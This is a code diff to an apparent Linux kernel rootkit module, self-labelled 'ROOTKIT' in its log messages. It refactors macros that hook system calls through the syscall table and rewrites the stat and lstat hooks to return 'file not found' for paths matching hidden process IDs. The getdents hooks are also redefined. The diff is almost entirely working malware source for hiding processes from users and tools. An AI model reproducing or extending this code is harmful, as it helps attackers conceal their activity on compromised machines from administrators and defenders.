@@ -51,29 +51,41 @@ unsigned long *syscall_table = NULL;
 #define args5 args4, regs->r8
 #define args6 args5, regs->r9
 #define args(n) args##n
-#define DECL_DO_HOOK(n_args, ret_type, ...) __MAP(n_args, __SC_DECL, __VA_ARGS__), ret_type ret
+#define DECL_DO_HOOK(n_args, ...) __MAP(n_args, __SC_DECL, __VA_ARGS__), const struct pt_regs* regs
+#define DECL_DO_HOOK_RET(n_args, ret_type, ...) __MAP(n_args, __SC_DECL, __VA_ARGS__), ret_type ret
 #define DECL_ORIG_HOOK(n_args, ...) const struct pt_regs* regs
 #define ARGS_ORIG(n_args, ...) regs
-#define ARGS_DO_HOOK(n_args, ...) args(n_args), ret
+#define ARGS_DO_HOOK(n_args, ...) args(n_args), regs
+#define ARGS_DO_HOOK_RET(n_args, ...) args(n_args), ret
 
 #else //normal args, kernel < 4.17
-#define DECL_DO_HOOK(n_args, ret_type, ...) DECL_ORIG_HOOK(n_args, __VA_ARGS__), ret_type ret
+#define DECL_DO_HOOK(n_args, ...) __MAP(n_args, __SC_DECL, __VA_ARGS__), const struct pt_regs* regs
+#define DECL_DO_HOOK_RET(n_args, ret_type, ...) __MAP(n_args, __SC_DECL, __VA_ARGS__), ret_type ret
 #define DECL_ORIG_HOOK(n_args, ...) __MAP(n_args, __SC_DECL, __VA_ARGS__)
 #define ARGS_ORIG(n_args, ...) __MAP(n_args, __SC_ARGS, __VA_ARGS__)
-#define ARGS_DO_HOOK(n_args, ...) ARGS_ORIG(n_args, __VA_ARGS__), ret
+#define ARGS_DO_HOOK(n_args, ...) ARGS_ORIG(n_args, __VA_ARGS__), NULL //regs is null, as these kernel versions do not use it
+#define ARGS_DO_HOOK_RET(n_args, ...) ARGS_ORIG(n_args, __VA_ARGS__), ret
 #endif
 
-#define hook_define(n_args, ret_type, syscall_name, ...) \
-	asmlinkage ret_type sys_##syscall_name##_do_hook(DECL_DO_HOOK(n_args, ret_type, __VA_ARGS__)); \
-	asmlinkage ret_type (*sys_##syscall_name##_orig)(DECL_ORIG_HOOK(n_args, __VA_ARGS__));         \
-	asmlinkage ret_type sys_##syscall_name##_hook(DECL_ORIG_HOOK(n_args, __VA_ARGS__)){            \
-		ret_type ret = sys_##syscall_name##_orig(ARGS_ORIG(n_args, __VA_ARGS__));                  \
-		return sys_##syscall_name##_do_hook(ARGS_DO_HOOK(n_args, __VA_ARGS__));                    \
+#define hook_define(n_args, ret_type, syscall_name, ...)                                               \
+	asmlinkage ret_type sys_##syscall_name##_do_hook(DECL_DO_HOOK(n_args, __VA_ARGS__));               \
+	asmlinkage ret_type (*sys_##syscall_name##_orig)(DECL_ORIG_HOOK(n_args, __VA_ARGS__));             \
+	asmlinkage ret_type sys_##syscall_name##_hook(DECL_ORIG_HOOK(n_args, __VA_ARGS__)){                \
+		return sys_##syscall_name##_do_hook(ARGS_DO_HOOK(n_args, __VA_ARGS__));                        \
 	}
+
+#define hook_define_ret(n_args, ret_type, syscall_name, ...)                                           \
+	asmlinkage ret_type sys_##syscall_name##_do_hook(DECL_DO_HOOK_RET(n_args, ret_type, __VA_ARGS__)); \
+	asmlinkage ret_type (*sys_##syscall_name##_orig)(DECL_ORIG_HOOK(n_args, __VA_ARGS__));             \
+	asmlinkage ret_type sys_##syscall_name##_hook(DECL_ORIG_HOOK(n_args, __VA_ARGS__)){                \
+		ret_type ret = sys_##syscall_name##_orig(ARGS_ORIG(n_args, __VA_ARGS__));                      \
+		return sys_##syscall_name##_do_hook(ARGS_DO_HOOK_RET(n_args, __VA_ARGS__));                    \
+	}
+
 // END HOOK DEFINING MACROS -----------------------------------------
 
-hook_define(3, long, getdents, unsigned int, fd, struct linux_dirent __user*, dirent, unsigned int, count);
-hook_define(3, long, getdents64, unsigned int, fd, struct linux_dirent64 __user*, dirent, unsigned int, count);
+hook_define_ret(3, long, getdents, unsigned int, fd, struct linux_dirent __user*, dirent, unsigned int, count);
+hook_define_ret(3, long, getdents64, unsigned int, fd, struct linux_dirent64 __user*, dirent, unsigned int, count);
 hook_define(2, long, stat, const char __user*, filename, struct __old_kernel_stat __user*, statbuf);
 hook_define(2, long, lstat, const char __user*, filename, struct __old_kernel_stat __user*, statbuf);
 
@@ -165,8 +177,7 @@ asmlinkage long sys_getdents64_do_hook(unsigned int fd, struct linux_dirent64 __
 	return ret;
 }
 
-asmlinkage long sys_stat_do_hook(const char __user *pathname, struct __old_kernel_stat __user *statbuf, long ret){
-	//printk(KERN_INFO "ROOTKIT: hello from stat\n");
+int sys_stat_helper(const char __user *pathname, struct __old_kernel_stat __user *statbuf, const struct pt_regs* regs){
 	struct list_pids_node* node;
 	char pid_str[8];
 	const char* filename;
@@ -175,15 +186,21 @@ asmlinkage long sys_stat_do_hook(const char __user *pathname, struct __old_kerne
 		filename = kbasename(pathname); //WARNING: I think it won't work if pathname ends with '/'
 		if (strcmp(pid_str, filename) == 0){
 			printk(KERN_INFO "ROOTKIT: AIBAA %s\n", pid_str);
-			return -ENOENT;
+			return -1;
 		}
 	}
-	return ret;
+	return 0;
 }
 
-asmlinkage long sys_lstat_do_hook(const char __user *pathname, struct __old_kernel_stat __user *statbuf, long ret){
+asmlinkage long sys_stat_do_hook(const char __user *pathname, struct __old_kernel_stat __user *statbuf, const struct pt_regs* regs){
+	if (sys_stat_helper(pathname, statbuf, regs) == -1) return -ENOENT;
+	return sys_stat_orig(ARGS_ORIG(2, const char __user *, pathname, struct __old_kernel_stat __user*, statbuf));
+}
+
+asmlinkage long sys_lstat_do_hook(const char __user *pathname, struct __old_kernel_stat __user *statbuf, const struct pt_regs* regs){
 	//printk(KERN_INFO "ROOTKIT: hello from stat\n");
-	return sys_stat_do_hook(pathname, statbuf, ret);
+	if (sys_stat_helper(pathname, statbuf, regs) == -1) return -ENOENT;
+	return sys_lstat_orig(ARGS_ORIG(2, const char __user *, pathname, struct __old_kernel_stat __user*, statbuf));
 }
 
 //__init para que solo lo haga una vez y después pueda sacarlo de memoria
